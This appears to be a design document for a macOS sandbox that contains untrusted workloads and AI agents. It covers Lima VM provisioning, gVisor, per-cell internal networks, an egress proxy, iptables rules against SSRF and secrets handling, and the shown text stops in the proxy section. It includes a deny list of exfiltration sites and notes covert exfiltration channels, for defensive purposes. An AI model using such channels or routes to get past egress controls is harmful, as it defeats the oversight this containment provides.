# Cell

## Secure Workload Harness — Design Document v9

**Date:** February 2026

**Revision Notes (v8 → v9):**
- Fixed iptables rule ordering (internal blocks before port allows) (blocker)
- Consolidated proxy image digest to single source of truth (blocker)
- Added proxy runtime hardening (read-only, NNP, non-root user) (high)
- Added NO_PROXY environment variable to cells (high)
- Fixed subnet allocator duplicate-free bug (medium)
- Fixed logrotate to use create instead of copytruncate (medium)
- Added proxy addon preflight validation (medium)
- Fixed Test 8 to create required network first (medium)
- Clarified gVisor is not a security boundary (documentation)
- Documented proxy failure behavior (documentation)

**Prior Revisions (v7 → v8):**
- Added proxy-before-cells enforcement (blocker)
- Added subnet allocator bounds checking (blocker)
- Fixed logger for concurrent-safe writes (blocker)
- Added CGNAT/reserved CIDR ranges to blocklists (blocker)
- Added proxy resource limits (high severity)
- Fixed log quota script race conditions (medium)
- Added policy reload semantics (medium)
- Fixed Test 8 shell variable scope (medium)
- Added failure mode diagnostics (medium)
- Added healthcheck loop prevention (medium)
- Added optional hardening section (future roadmap)
- Standardized terminology and dates

---

## Overview

**Cell** is a secure, observable harness for running untrusted code on macOS. It provides VM-isolated containers (hardware boundary at the Lima VM) with controlled network egress and full observability.

### What It Does

- **Isolates workloads** — Each workload runs in its own container with its own network
- **Protects your host** — Lima VM provides hardware boundary; gVisor reduces kernel attack surface
- **Controls network** — All egress goes through an observable proxy with policy enforcement
- **Logs all network requests** — Every network request is logged and attributed to its source workload
- **Manages state** — Persistent workspaces, safe file export, secrets handling

### Use Cases

| Use Case | Why Cell Helps |
|----------|----------------|
| **AI agents** | Agents execute arbitrary code; Cell contains the blast radius |
| **CI/CD runners** | Build untrusted code without risking the host |
| **Student code** | Run submissions safely; prevent cheating via network |
| **Plugin sandboxes** | Extensions can't escape or exfiltrate data unobserved |
| **Research** | Experiment with untrusted software safely |
| **Development** | Test with strict network policies |

### Threat Model

**This is containment, not air-gapped isolation.** Cell provides:
- Strong host protection (Lima VM boundary)
- Observable network egress (all traffic logged)
- Reduced blast radius (cells can't attack each other)

Cell does **not** provide:
- Prevention of data exfiltration to allowed domains
- Malware analysis isolation (cells have network access)
- Protection against a determined attacker with allowed egress

**Key boundary clarification:** Lima VM is the **only** hard security boundary. gVisor is defense-in-depth inside the VM—it reduces attack surface but is not a security boundary. If gVisor has a vulnerability, the Lima VM still protects macOS.

**Proxy failure mode:** If the proxy stops, all cell egress fails closed (no network path exists). Cells may hang on network calls until timeout. Run `cell proxy status` to check, `cell proxy start` to recover.

**Covert channel note:** Even with a tight allowlist, covert exfiltration is possible via:
- DNS over HTTPS (DoH) to allowed HTTPS endpoints
- Steganography in allowed API responses
- Timing-based channels

If you need true air-gap isolation, disable all network egress or use a dedicated offline VM.

### Architecture

```
┌────────────────────────────────────────────────────────────────┐
│                          macOS Host                            │
│                                                                │
│   Your files, credentials, apps — protected from workloads     │
│                                                                │
│   ┌──────────────────────────────────────────────────────────┐ │
│   │                   Lima VM (Boundary #1)                  │ │
│   │                                                          │ │
│   │  ┌─────────┐ ┌─────────┐ ┌─────────┐      ┌─────────┐   │ │
│   │  │ gVisor  │ │ gVisor  │ │ gVisor  │      │  Proxy  │   │ │
│   │  │┌───────┐│ │┌───────┐│ │┌───────┐│      │ ─────── │   │ │
│   │  ││Cell A ││ ││Cell B ││ ││Cell C ││      │  Logs   │   │ │
│   │  │└───────┘│ │└───────┘│ │└───────┘│      │ Policy  │   │ │
│   │  │ State A │ │ State B │ │ State C │      └────┬────┘   │ │
│   │  └────┬────┘ └────┬────┘ └────┬────┘           │        │ │
│   │       └───────────┴─────┬─────┴────────────────┘        │ │
│   │                         │                               │ │
│   │              Internal Networks (no east-west)           │ │
│   │                                                         │ │
│   └─────────────────────────┼───────────────────────────────┘ │
│                             ▼                                 │
└─────────────────────────── Internet ──────────────────────────┘
```

---

## Security Model

### Two Boundaries

| Boundary | Technology | Protects Against |
|----------|------------|------------------|
| **#1: Lima VM** | Hardware virtualization (Apple VZ) | Workload attacking macOS |
| **#2: gVisor** | Syscall interception | Workload exploiting Linux kernel |

### What's Protected

| Asset | How |
|-------|-----|
| Your Mac | Lima VM — hardware boundary |
| Lima's kernel | gVisor — workloads can't make direct syscalls |
| Cell A's state | Own network + Podman namespaces + gVisor |
| Cell B's state | Own network + Podman namespaces + gVisor |
| Network traffic | Observable proxy (enforced, not bypassable) |

### What Workloads CANNOT Do

- Access your Mac's filesystem
- Access another cell's workspace
- See another cell's processes
- Communicate with other cells directly (separate networks)
- Reach the internet without going through proxy
- Use proxy as a router (IP forwarding disabled)

**gVisor note:** gVisor reduces kernel attack surface but does not eliminate kernel-level compromise risk. gVisor itself can have vulnerabilities. Lima VM remains the only hard security boundary.

### Scope

**Primary goal:** Protect macOS host from untrusted workloads.

**Acceptable risk:** A sophisticated attack could compromise the Lima VM. This is detectable (logs, monitoring) and recoverable (destroy and recreate VM). Full mitigation would require per-cell microVMs (Firecracker), which adds complexity.

**gVisor's role:** Defense-in-depth inside the Lima VM. If gVisor were disabled, macOS would still be protected by the Lima VM boundary. gVisor reduces the syscall surface presented to the Lima kernel (mitigating kernel exploit risk) and strengthens cell-to-cell isolation.

---

## Quick Start

### 1. Install Lima

```bash
brew install lima
```

### 2. Create VM

```bash
# Create the Cell VM using the bundled configuration
limactl create --name=cells ~/.cells/lima.yaml
limactl start cells
```

**Note:** The `lima.yaml` file is created during Cell installation. See the Configuration section for the full contents.

### 3. Verify gVisor

```bash
limactl shell cells -- runsc --version
# Should print version info
```

### 4. Run a Cell

```bash
./cell run --name my-cell --image python:3.11-slim

# Or from a config file
./cell run -f cells/example-cell.yaml
```

### 5. Interact

```bash
./cell logs my-cell -f        # Watch logs
./cell network my-cell -f     # Watch network
./cell files my-cell          # Browse workspace
./cell stop my-cell           # Stop
```

---

## Configuration

### Directory Layout

```
~/.cells/
├── lima.yaml                 # VM config
├── network-policy.yaml       # Allowlist
├── cells/                    # Cell definitions
│   ├── research-agent.yaml
│   └── github-bot.yaml
├── secrets/                  # Single-value secret files
│   ├── openai-key.txt        # Contains just: sk-...
│   ├── anthropic-key.txt     # Contains just: sk-ant-...
│   ├── github-token.txt      # Contains just: ghp_...
│   └── db-password.txt       # Contains just: hunter2
└── state/                    # Cell state (workspaces, logs)
    ├── system/               # System state (survives VM recreate)
    │   └── subnets.json      # Subnet allocator persistent state
    ├── cell-abc123/
    │   ├── workspace/        # Cell's files
    │   ├── stdout.log
    │   └── stderr.log
    └── cell-def456/
        └── ...
```

**Secrets model:** One file = one secret. Cells explicitly declare which secrets they need. No implicit loading.

**Note:** Network logs are stored in `/var/log/cells/network/` inside the VM (not in cell state directories) to limit proxy filesystem access.

**Reserved subnets:** Index 0 (`10.60.0.0/24`) is reserved for future use (e.g., management network). Cell subnets start at index 1.

### Cell Definition

```yaml
# cells/research-agent.yaml

name: research-agent
image: python:3.11-slim

# Restart policy for long-running cells
restart: unless-stopped    # always | unless-stopped | on-failure | no

# Optional: kill after duration (omit for continuous cells)
# timeout: 1h

# Regular environment variables
env:
  TASK_ID: "12345"
  DEBUG: "true"

# Secrets - explicitly declare which secrets this cell needs
# Each entry references a file in ~/.cells/secrets/
secrets:
  - openai-key              # File: openai-key.txt → Env: OPENAI_KEY_FILE
  - anthropic-key           # File: anthropic-key.txt → Env: ANTHROPIC_KEY_FILE
  # This cell does NOT get github-token or db-password

files:
  - ./task.json:/work/task.json
  - ./config/:/work/config/:ro

command: ["python", "/work/main.py"]
```

```yaml
# cells/github-bot.yaml - different cell, different secrets

name: github-bot
image: python:3.11-slim

secrets:
  - github-token            # File: github-token.txt → Env: GITHUB_TOKEN_FILE
  # This cell does NOT get openai-key or anthropic-key

command: ["python", "/work/bot.py"]
```

**Custom env var names:**

```yaml
secrets:
  - openai-key                      # → Env: OPENAI_KEY_FILE (points to /run/secrets/openai-key)
  - name: anthropic-key
    as: ANTHROPIC_API_KEY_FILE      # → ANTHROPIC_API_KEY_FILE (points to /run/secrets/anthropic-key)
  - name: db-password
    as: DATABASE_PASSWORD_FILE      # → DATABASE_PASSWORD_FILE (points to /run/secrets/db-password)
```

### Minimal Inline

```bash
./cell run \
  --name quick \
  --image python:3.11-slim \
  --env TASK=hello \
  -- python -c "print('hello')"
```

### Network Policy

```yaml
# network-policy.yaml

default: deny

allow:
  - pypi.org
  - "*.pythonhosted.org"
  - github.com
  - "*.githubusercontent.com"
  - api.openai.com
  - api.anthropic.com

deny:
  - pastebin.com
  - "*.ngrok.io"
```

**Enforcement:** Domain allowlists are enforced using the hostname/SNI observed by the proxy. Direct IP connections (e.g., `curl http://142.250.80.46`) are not allowlisted and are blocked. This prevents cells from bypassing domain rules by using IP addresses directly.

### Proxy Unbypassability Guarantee

Cell containers are attached only to a per-cell **internal** Podman network (created with `--internal`). These networks have **no route/NAT to the VM's egress interface**.

The only component with internet access is the **proxy**, which is the **only** container attached to:

- each `cell-*` internal network (to accept proxied requests), and
- the `proxy-external` network (for outbound access).

Additionally, the Lima VM applies a **fail-closed** firewall on traffic forwarded from the `proxy-external` CIDR to the VM egress interface, allowing only the proxy's required ports and blocking internal ranges (see "VM-level outbound restrictions"). This means:

- Cells cannot reach the internet directly, even if they ignore `HTTP_PROXY/HTTPS_PROXY`.
- The proxy is a mandatory choke point for all egress.

### DNS Model

- Cells do not perform external DNS lookups directly. External name resolution happens inside the proxy as part of egress.
- Cells only need internal DNS to resolve the proxy hostname (`proxy`) on their private network. Podman's internal DNS handles this automatically.
- **DNS over HTTPS (DoH):** If a cell attempts DoH to an allowed domain (e.g., `cloudflare-dns.com`), the request will succeed but is **visible in proxy logs** as HTTPS traffic to that domain. DoH is not blocked by default; add DoH providers to your denylist if you want to prevent it.
- If a cell attempts DNS tunneling or DoT over allowed HTTPS destinations, it will still traverse the proxy and be logged. Prevention of covert DNS channels is out of scope for V1.

---

## Lima VM Setup

### Backend Requirements

This design is tested with:
- **Lima:** 0.18+ with `vz` (Virtualization.framework) on macOS
- **Podman:** 4.0+ with netavark backend (default on Ubuntu 24.04), **rootful mode**
- **gVisor:** runsc from official releases

**Rootful vs Rootless:** We use **rootful Podman** inside the Lima VM for simplicity:
- gVisor works reliably with rootful
- Network namespace management is simpler
- VM-level iptables rules work correctly
- The VM itself is the isolation boundary, so rootful inside VM is acceptable

Other configurations may work but are not tested:
- Podman with CNI backend (older)
- Rootless Podman (cgroups limitations with gVisor)
- Lima with QEMU backend (slower, but more portable)

```yaml
# lima.yaml

vmType: vz
mountType: virtiofs
rosetta:
  enabled: true

cpus: 4
memory: 8GiB
disk: 50GiB

mounts:
  - location: "~/.cells/state"
    mountPoint: "/state"
    writable: true
    # NOTE: No noexec here - cells need to execute scripts from workspace
  - location: "~/.cells/secrets"
    mountPoint: "/secrets"
    writable: false
  - location: "~/.cells/cells"
    mountPoint: "/cells"
    writable: false
  # Secrets live on macOS as files under ~/.cells/secrets and are mounted read-only into the VM.
  # The cell runner mounts selected secret files into containers at /run/secrets/* (no secret values in env vars).

images:
  - location: "https://cloud-images.ubuntu.com/releases/24.04/release/ubuntu-24.04-server-cloudimg-arm64.img"
    arch: "aarch64"
  - location: "https://cloud-images.ubuntu.com/releases/24.04/release/ubuntu-24.04-server-cloudimg-amd64.img"
    arch: "x86_64"

provision:
  - mode: system
    script: |
      #!/bin/bash
      set -eux
      
      echo "=== Installing packages ==="
      apt-get update
      apt-get install -y podman iptables curl jq
      
      # Install yq for YAML parsing in cell runner
      wget -qO /usr/local/bin/yq https://github.com/mikefarah/yq/releases/latest/download/yq_linux_$(dpkg --print-architecture)
      chmod +x /usr/local/bin/yq
      
      echo "=== Installing gVisor ==="
      curl -fsSL https://gvisor.dev/archive.key | gpg --dearmor -o /usr/share/keyrings/gvisor.gpg
      echo "deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/gvisor.gpg] https://storage.googleapis.com/gvisor/releases release main" > /etc/apt/sources.list.d/gvisor.list
      apt-get update && apt-get install -y runsc
      
      echo "=== Configuring Podman (rootful) ==="
      mkdir -p /etc/containers/containers.conf.d
      cat > /etc/containers/containers.conf.d/gvisor.conf << 'CONF'
[engine]
runtime = "runsc"

[engine.runtimes]
runsc = ["/usr/bin/runsc"]
CONF
      
      echo "=== Disabling IPv6 ==="
      cat > /etc/sysctl.d/99-disable-ipv6.conf << 'SYSCTL'
net.ipv6.conf.all.disable_ipv6 = 1
net.ipv6.conf.default.disable_ipv6 = 1
SYSCTL
      sysctl -p /etc/sysctl.d/99-disable-ipv6.conf
      
      echo "=== Creating networks ==="
      # External network for proxy egress
      podman network create --subnet 10.51.0.0/24 proxy-external
      # Cell networks are created per-cell by cell CLI
      
      echo "=== Configuring mount security ==="
      # /cells is noexec (cell configs should never execute)
      # /state is exec-enabled (cells need to run scripts from workspace)
      # Secrets are mounted as files into containers at /run/secrets/* (no secret values in env vars).
      cat >> /etc/fstab << 'FSTAB'
/cells /cells none bind,remount,noexec,nosuid,nodev 0 0
FSTAB
      mount -o remount,noexec,nosuid,nodev /cells 2>/dev/null || true
      
      echo "=== Creating runtime directories ==="
      mkdir -p /var/run/cells
      mkdir -p /var/log/cells/network
      mkdir -p /state/system  # Persistent allocator state (survives reboot)
      
      # Initialize subnet allocator state (persistent)
      if [[ ! -f /state/system/subnets.json ]]; then
        cat > /state/system/subnets.json << 'JSON'
{"next_index": 1, "allocated": {}, "freed": []}
JSON
      fi
      # Runtime mapping for proxy (rebuilt from persistent state on boot)
      echo '{}' > /var/run/cells/subnet-map.json
      
      echo "=== Configuring log rotation ==="
      cat > /etc/logrotate.d/cells << 'EOF'
# Cell stdout/stderr logs (copytruncate is safe here - not using flock)
/state/*/stdout.log /state/*/stderr.log {
    daily
    rotate 7
    compress
    missingok
    notifempty
    copytruncate
    maxsize 100M
}

# Proxy network logs - use create + SIGHUP (avoids truncation race with flock)
/var/log/cells/network/*.jsonl {
    daily
    rotate 7
    compress
    missingok
    notifempty
    create 0644 root root
    maxsize 100M
    postrotate
        # Signal proxy to reopen log files
        pkill -HUP -f "mitmdump" 2>/dev/null || true
    endscript
}
EOF
      
      echo "=== Configuring proxy egress firewall ==="
      # Fail-closed proxy outbound policy at the *VM* level (cannot be bypassed from inside the proxy container).
      
      # Identify VM egress interface (Ubuntu/Lima usually eth0, but don't assume)
      EGR_IF="$(ip route show default | awk '{print $5; exit}')"
      
      # Proxy-external network CIDR (must match `podman network create proxy-external --subnet ...`)
      PROXY_EXT_CIDR="10.51.0.0/24"
      
      # DNS configuration: set to "public" (default) or "internal" 
      # - "public": DNS only to public resolvers (more secure, blocks internal DNS)
      # - "internal": DNS to any destination including RFC1918 (required if Lima uses internal resolver)
      DNS_MODE="${CELL_DNS_MODE:-public}"
      
      # Create chain (idempotent-ish)
      iptables -N PROXY_EGRESS 2>/dev/null || true
      iptables -F PROXY_EGRESS
      
      # Allow established/related connections (return traffic)
      iptables -A PROXY_EGRESS -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
      
      # Block internal destinations FIRST (defense-in-depth against SSRF)
      # These rules MUST come before the port 80/443 allow rule
      # RFC1918 private ranges
      iptables -A PROXY_EGRESS -d 10.0.0.0/8 -j DROP
      iptables -A PROXY_EGRESS -d 172.16.0.0/12 -j DROP
      iptables -A PROXY_EGRESS -d 192.168.0.0/16 -j DROP
      # Localhost
      iptables -A PROXY_EGRESS -d 127.0.0.0/8 -j DROP
      # Link-local
      iptables -A PROXY_EGRESS -d 169.254.0.0/16 -j DROP
      # CGNAT (Carrier-Grade NAT) - important for cloud environments
      iptables -A PROXY_EGRESS -d 100.64.0.0/10 -j DROP
      # Benchmarking range
      iptables -A PROXY_EGRESS -d 198.18.0.0/15 -j DROP
      # Reserved (Class E)
      iptables -A PROXY_EGRESS -d 240.0.0.0/4 -j DROP
      
      # NOW allow outbound HTTP/HTTPS (only public IPs can reach here)
      iptables -A PROXY_EGRESS -p tcp -m multiport --dports 80,443 -j ACCEPT
      
      # DNS configuration: set to "public" (default) or "internal" 
      # - "public": DNS only to public resolvers (more secure, blocks internal DNS)
      # - "internal": DNS to any destination including RFC1918 (required if Lima uses internal resolver)
      DNS_MODE="${CELL_DNS_MODE:-public}"
      
      # DNS: allowed after internal blocks and port allows
      if [ "$DNS_MODE" = "internal" ]; then
        echo "WARNING: Internal DNS enabled - proxy can reach RFC1918 DNS resolvers"
        # Insert DNS rules at position 2 (after ESTABLISHED) to allow internal DNS
        iptables -I PROXY_EGRESS 2 -p udp --dport 53 -j ACCEPT
        iptables -I PROXY_EGRESS 3 -p tcp --dport 53 -j ACCEPT
      else
        # Public DNS only - internal DNS is blocked by the rules above
        iptables -A PROXY_EGRESS -p udp --dport 53 -j ACCEPT
        iptables -A PROXY_EGRESS -p tcp --dport 53 -j ACCEPT
      fi
      
      # Fail-closed: deny all else (no arbitrary ports)
      iptables -A PROXY_EGRESS -j DROP
      
      # Apply to forwarded traffic *from the proxy-external network* toward the VM egress interface.
      # (Do NOT use -m owner here; owner matching only works for locally-generated OUTPUT traffic.)
      iptables -D FORWARD -s "$PROXY_EXT_CIDR" -o "$EGR_IF" -j PROXY_EGRESS 2>/dev/null || true
      iptables -I FORWARD -s "$PROXY_EXT_CIDR" -o "$EGR_IF" -j PROXY_EGRESS
      
      # Persist firewall rules across reboot
      apt-get install -y iptables-persistent
      netfilter-persistent save
      
      echo "=== Setting up proxy systemd service ==="
      # Proxy must start before cells (critical ordering)
      cat > /etc/systemd/system/cell-proxy.service << 'SYSTEMD'
[Unit]
Description=Cell Network Proxy
After=network-online.target podman.socket
Wants=network-online.target
Before=podman-restart.service

[Service]
Type=simple
ExecStartPre=/usr/local/bin/cell-proxy-preflight.sh
ExecStart=/usr/local/bin/cell-proxy-start.sh
ExecStop=/usr/bin/podman stop proxy
Restart=on-failure
RestartSec=5

[Install]
WantedBy=multi-user.target
SYSTEMD
      
      # Preflight script: validate addons exist (fail closed)
      cat > /usr/local/bin/cell-proxy-preflight.sh << 'PREFLIGHT'
#!/bin/bash
set -eu

# Validate required addon files exist (fail closed)
for addon in enforce.py logger.py; do
  if [[ ! -f "/cells/addons/$addon" ]]; then
    echo "FATAL: Missing required addon: /cells/addons/$addon"
    exit 1
  fi
done

echo "Preflight checks passed"
PREFLIGHT
      chmod +x /usr/local/bin/cell-proxy-preflight.sh
      
      systemctl daemon-reload
      systemctl enable cell-proxy.service
      systemctl enable podman-restart.service
      
      echo "=== Running self-tests ==="
      
      # Test 1: Verify east-west isolation
      echo "Testing east-west isolation..."
      podman network create --internal test-net-a
      podman network create --internal test-net-b
      podman run --rm -d --network test-net-a --name test-a alpine sleep 60
      if podman run --rm --network test-net-b alpine ping -c1 -W2 test-a 2>/dev/null; then
        echo "FATAL: East-west traffic possible between networks!"
        exit 1
      fi
      echo "✓ East-west isolation verified"
      podman rm -f test-a 2>/dev/null || true
      podman network rm test-net-a test-net-b 2>/dev/null || true
      
      # Test 2: Verify internal network has no internet
      echo "Testing internal network isolation..."
      podman network create --internal test-internal
      if podman run --rm --network test-internal alpine wget -q -O /dev/null --timeout=5 http://example.com 2>/dev/null; then
        echo "FATAL: Internal network can reach internet!"
        exit 1
      fi
      echo "✓ Internal network has no internet access"
      podman network rm test-internal 2>/dev/null || true
      
      # Test 3: Verify external network has internet
      echo "Testing external network connectivity..."
      if ! podman run --rm --network proxy-external alpine wget -q -O /dev/null --timeout=10 http://example.com; then
        echo "FATAL: External network cannot reach internet!"
        exit 1
      fi
      echo "✓ External network has internet access"
      
      # Test 4: Verify gVisor is working
      echo "Testing gVisor..."
      if ! podman run --rm --runtime=runsc alpine cat /proc/version | grep -qi gvisor; then
        echo "WARNING: gVisor may not be working correctly"
      fi
      echo "✓ gVisor runtime working"
      
      echo "=== All self-tests passed ==="

# No host port forwards by default (reduces attack surface)
```

### macOS State Directory Protection

The `~/.cells/state/` directory contains untrusted cell output. Protect it on macOS:

```bash
# Create with restricted permissions
mkdir -p ~/.cells/state
chmod 700 ~/.cells/state

# Add macOS quarantine attribute (prevents double-click execution)
xattr -w com.apple.quarantine "0181;$(printf '%x' $(date +%s));cell;$(uuidgen)" ~/.cells/state

# Optional: Create a dedicated macOS user for cell state
# This provides stronger isolation
sudo dscl . -create /Users/cellstate
sudo dscl . -create /Users/cellstate UserShell /usr/bin/false
sudo mkdir -p /Users/cellstate/.cells
sudo chown -R cellstate:staff /Users/cellstate/.cells
```

**Stronger isolation options:**

For high-security environments, consider additional friction against accidental execution:

```bash
# Option 1: Separate APFS volume (recommended for production)
# Creates an isolated volume that can have different permissions
diskutil apfs addVolume disk1 APFS CellState
sudo mkdir /Volumes/CellState/cells-state
sudo chown $USER /Volumes/CellState/cells-state
ln -s /Volumes/CellState/cells-state ~/.cells/state

# Option 2: Immutable flag on state directory root
# Prevents accidental modification (must unlock to change)
chflags uchg ~/.cells/state
# To unlock: chflags nouchg ~/.cells/state
```

**Execution policy:**

| Environment | Can Execute from State? | Reason |
|-------------|------------------------|--------|
| macOS Finder | ❌ Quarantined | Gatekeeper blocks |
| macOS Terminal | ⚠️ Possible but warned | User must chmod +x |
| Lima VM | ✅ Yes | Cells need it |
| Cell containers | ✅ Yes | Workspaces must be executable |


### Practical Rule: Treat `/state` as untrusted on macOS

Even with quarantine enabled, the most realistic "escape" is **you** opening or executing artifacts that a cell wrote into the shared state directory.

Recommended workflow:
- Review artifacts **inside the VM** first (`cell cat`, `cell ls`, `cell grep`, etc.).
- Export via `cell cp --sanitize` into a dedicated export directory.
- If you must open files on macOS, do it from the export directory (never directly from `~/.cells/state/...`).

**Invariant:** Nothing in `~/.cells/state/<cell>/work` should be executed on macOS without manual review.

**Never run `xattr -d com.apple.quarantine` on the state directory.**

### Network Topology (Per-Cell Networks)

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                                Lima VM                                       │
│                                                                              │
│  ┌──────────────────┐  ┌──────────────────┐  ┌──────────────────┐           │
│  │    cell-a        │  │    cell-b        │  │    cell-c        │           │
│  │   (--internal)   │  │   (--internal)   │  │   (--internal)   │           │
│  │                  │  │                  │  │                  │           │
│  │  ┌────────────┐  │  │  ┌────────────┐  │  │  ┌────────────┐  │           │
│  │  │   Cell A   │  │  │  │   Cell B   │  │  │  │   Cell C   │  │           │
│  │  │  (gVisor)  │  │  │  │  (gVisor)  │  │  │  │  (gVisor)  │  │           │
│  │  └─────┬──────┘  │  │  └─────┬──────┘  │  │  └─────┬──────┘  │           │
│  │        │         │  │        │         │  │        │         │           │
│  │  ┌─────┴──────┐  │  │  ┌─────┴──────┐  │  │  ┌─────┴──────┐  │           │
│  │  │   Proxy    │  │  │  │   Proxy    │  │  │  │   Proxy    │  │           │
│  │  │  (joined)  │  │  │  │  (joined)  │  │  │  │  (joined)  │  │           │
│  │  └────────────┘  │  │  └────────────┘  │  │  └────────────┘  │           │
│  └──────────────────┘  └──────────────────┘  └──────────────────┘           │
│                                    │                                         │
│                          ┌─────────┴─────────┐                              │
│                          │  proxy-external    │                              │
│                          │  (has internet)    │                              │
│                          └─────────┬─────────┘                              │
└────────────────────────────────────┼────────────────────────────────────────┘
                                     ▼
                                 Internet
```

**Key points:**
- Each cell gets its own `--internal` network (created by `cell run`)
- Proxy joins each cell's network (so DNS name `proxy` resolves)
- No shared network = no east-west traffic by topology
- No iptables rules needed = no chain ordering bugs
- IPv6 disabled = simpler security model
- Proxy has `ip_forward=0` and rejects requests to internal IPs

---

## CLI Reference

```
cell - Secure Workload Harness CLI

COMMANDS:
  run         Run a cell
  verify      Verify invariants (networks, proxy, runtime)
  stop        Stop a cell gracefully
  kill        Kill a cell immediately
  rm          Remove a cell and its state
  list        List cells (shows runtime, network, status)
  start       Start a stopped cell
  
  logs        View cell logs (stdout/stderr)
  network     View cell network activity  
  files       List cell workspace
  cat         View file from workspace (safe, doesn't execute)
  cp          Copy file to/from workspace (validates paths)
  exec        Execute command in running cell
  inspect     Show cell details (runtime, network, mounts, secrets)
  
  proxy       Manage proxy service
  vm          Manage Lima VM
  workspace   Manage cell workspaces
  secrets     List/validate secrets
  
  diagnose    Diagnose connectivity issues (new in v8)
  test        Run verification tests

RUN FLAGS:
  --name NAME          Cell name (required)
  --image IMAGE        Container image
  -f FILE              Load config from file (includes secrets declarations)
  -d, --detach         Run in background
  --rm                 Remove after exit
  --timeout DURATION   Kill after duration (e.g., 1h, 30m)
  --restart POLICY     Restart policy (no, on-failure, unless-stopped, always)
  --runtime RUNTIME    Container runtime (runsc default, runc requires --unsafe)
  --unsafe             Allow dangerous operations (required for --runtime=runc)
  --no-proxy-env       Don't set HTTP_PROXY/HTTPS_PROXY (for testing)
  --env KEY=VALUE      Set additional environment variable

SECRETS COMMANDS:
  cell secrets list              List all secret files in ~/.cells/secrets/
  cell secrets show SECRET       Show which cells use a secret
  cell secrets validate CELL     Check if all secrets for a cell exist

CP FLAGS:
  --sanitize           Block dangerous file types (deterministic, no prompts)
  --allow-scripts      Allow .sh/.py/.js/.rb/.pl with --sanitize
  --allow-office       Allow .docx/.xlsx/.pptx/.pdf with --sanitize
  --force              Skip safety checks (dangerous)
  --follow-symlinks    Follow symlinks (default: skip with warning)

VM COMMANDS:
  cell vm status       Show VM status
  cell vm shell        Open shell in VM
  cell vm restart      Restart VM
  cell vm recreate     Destroy and recreate VM (preserves macOS state)
  cell vm logs         Show VM provisioning logs

WORKSPACE COMMANDS:
  cell workspace list CELL        List files in workspace
  cell workspace clean CELL       Delete all files in workspace
  cell workspace size CELL        Show disk usage

DIAGNOSE COMMAND (new in v8):
  cell diagnose CELL              Run connectivity diagnostics
  
  Output includes:
  - Proxy status (running/stopped)
  - Cell network attachment
  - Last 5 blocked requests from proxy logs
  - DNS resolution test
  - Suggested fixes

EXAMPLES:
  cell run --name x --image python:3.11-slim
  cell run -f cells/my-cell.yaml -d
  cell secrets validate my-cell   # Check secrets exist before running
  cell run --name test --no-proxy-env -- curl https://google.com  # Test isolation
  cell logs x -f
  cell network x --json | jq 'select(.blocked)'
  cell cp --sanitize x:/work/report.html ./report.html
  cell stop x
  cell vm recreate  # Reset VM to clean state
  cell diagnose x   # Debug connectivity issues
```

---

## How Cells Run

```bash
# What happens when you run: cell run -f cells/my-cell.yaml

CELL_NAME="my-cell"
CELL_YAML="/cells/my-cell.yaml"  # VM path (mounted read-only from ~/.cells/cells/)
SECRETS_DIR="/secrets"            # VM path (mounted read-only from ~/.cells/secrets/)

# 0) CRITICAL: Verify proxy is running (fail-fast, not silent failure)
if ! podman ps --format '{{.Names}}' | grep -q '^proxy$'; then
  echo "ERROR: Proxy is not running. Start it with: cell proxy start"
  echo ""
  echo "Diagnostics:"
  echo "  Proxy status: $(systemctl is-active cell-proxy.service 2>/dev/null || echo 'unknown')"
  echo "  Run 'cell diagnose' for more details"
  exit 1
fi

# Verify proxy is healthy (can reach external network)
if ! podman exec proxy curl -sf -m 5 -o /dev/null https://example.com; then
  echo "ERROR: Proxy is running but cannot reach internet"
  echo "Run 'cell diagnose' for details"
  exit 1
fi

# 1) Read secrets declared in cell definition and prepare file mounts
MOUNT_ARGS=()
ENV_ARGS=()

# Supported secret formats in YAML:
#   secrets:
#     - openai-key
#     - name: github-token
#       as: GITHUB_TOKEN_FILE
#
# NOTE: We never inject secret *values* as environment variables.
# We only mount secret files and (optionally) provide *_FILE env vars.

for secret_name in $(yq -r '.secrets[] | if type == "object" then .name else . end' "$CELL_YAML"); do
  vm_file="${SECRETS_DIR}/${secret_name}.txt"
  if [[ ! -f "$vm_file" ]]; then
    echo "ERROR: Secret not found: $vm_file"
    exit 1
  fi

  container_path="/run/secrets/${secret_name}"
  MOUNT_ARGS+=("-v" "${vm_file}:${container_path}:ro")

  # Optional: choose env var name that points to the file path
  as_name=$(yq -r ".secrets[] | select(type==\"object\" and .name == \"${secret_name}\") | .as // empty" "$CELL_YAML")
  if [[ -n "$as_name" ]]; then
    env_name="$as_name"
  else
    # Default convention: <SECRET>_FILE
    base=$(echo "$secret_name" | tr 'a-z-' 'A-Z_')
    env_name="${base}_FILE"
  fi

  ENV_ARGS+=("--env" "${env_name}=${container_path}")
done

# 2) Allocate subnet and create isolated per-cell network (no external routing)
SUBNET=$(cell allocate-subnet "$CELL_NAME")  # e.g., 10.60.5.0/24
NET_NAME="cell-${CELL_NAME}"

podman network create --internal --subnet "$SUBNET" "$NET_NAME"

# 3) Ensure proxy exists and is connected to this cell network
cell proxy ensure-running
podman network connect "$NET_NAME" proxy

# 4) Start the cell container (gVisor by default)
podman run --name "$CELL_NAME" \
  --runtime=runsc \
  --network "$NET_NAME" \
  --read-only \
  --tmpfs /tmp:rw,size=512m \
  --tmpfs /run:rw,size=64m \
  --tmpfs /var/tmp:rw,size=512m \
  --tmpfs /home:rw,size=256m \
  --cap-drop=ALL \
  --security-opt=no-new-privileges \
  --ulimit nofile=4096:4096 \
  -v "/state/${CELL_NAME}/workspace:/work:rw" \
  "${MOUNT_ARGS[@]}" \
  -e HTTP_PROXY=http://proxy:8080 \
  -e HTTPS_PROXY=http://proxy:8080 \
  -e NO_PROXY=127.0.0.1,localhost,proxy \
  "${ENV_ARGS[@]}" \
  <image> <command...>
```



### Default Container Resource Limits

To prevent runaway workloads from exhausting VM resources, `cell run` applies these defaults:

```bash
--memory=2g --pids-limit=512 --cpus=2 --ulimit nofile=4096:4096
```

These defaults can be overridden per-cell:

```yaml
# In cell definition
resources:
  memory: 4g      # Override default 2g
  cpus: 4         # Override default 2
  pids: 1024      # Override default 512
  nofile: 8192    # Override default 4096 (file descriptors)
```

Or via CLI flags:

```bash
cell run --name my-cell --memory=4g --cpus=4 --image python:3.11-slim
```

**Note:** These are soft limits. For hard isolation, rely on the Lima VM's total resource allocation.

## Proxy Service

Runs inside Lima. Routes and logs all cell traffic.

```bash
# Start
cell proxy start

# View logs
cell proxy logs -f

